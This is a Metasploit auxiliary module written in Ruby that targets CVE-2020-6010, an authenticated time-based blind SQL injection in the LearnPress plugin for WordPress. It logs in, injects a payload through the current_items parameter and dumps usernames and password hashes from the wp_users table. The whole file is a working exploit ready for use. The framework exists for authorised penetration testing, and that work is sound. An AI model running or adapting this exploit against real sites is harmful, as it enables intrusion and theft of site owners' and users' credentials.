##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress LearnPress current_items Authenticated SQLi',
        'Description' => %q{
          LearnPress, a learning management plugin for WordPress,
          prior to 3.2.6.8 is affected by an authenticated SQL injection via the
          current_items parameter of the post-new.php page.
        },
        'Author' => [
          'h00die', # msf module
          'Omri Herscovici', # Discovery and PoC
          'Sagi Tzadik', # Discovery and PoC
          'nhattruong' # edb poc
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-6010'],
          ['URL', 'https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/'],
          ['EDB', '50137'],
          ['WPVDB', '10208']
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2020-04-29',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
      OptString.new('USERNAME', [true, 'Valid Username for login', '']),
      OptString.new('PASSWORD', [true, 'Valid Password for login', ''])
    ]
  end

  def run_host(ip)
    unless wordpress_and_online?
      vprint_error('Server not online or not detected as wordpress')
      return
    end

    checkcode = check_plugin_version_from_readme('learnpress', '3.2.6.8')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error('Learnpress version not vulnerable')
      return
    end
    print_good('Vulnerable version detected')

    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])

    if cookie.nil?
      vprint_error('Invalid login, check credentials')
      return
    end

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'POST',
        'cookie' => cookie,
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post-new.php'),
        'vars_get' => {
          'post_type' => 'lp_order'
        },
        'vars_post' => {
          'type' => 'lp_course',
          'context' => 'order-items',
          'context_id' => Rex::Text.rand_text_numeric(2, 0), # avoid 0s incase leading 0 gives bad results
          'term' => Rex::Text.rand_text_alpha(8),
          'paged' => 1,
          'lp-ajax' => 'modal_search_items',
          'current_items[]' => "1 AND (SELECT #{Rex::Text.rand_text_numeric(4, 0)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)})"
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user_login', 'user_pass']

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good(table.to_s)
  end
end
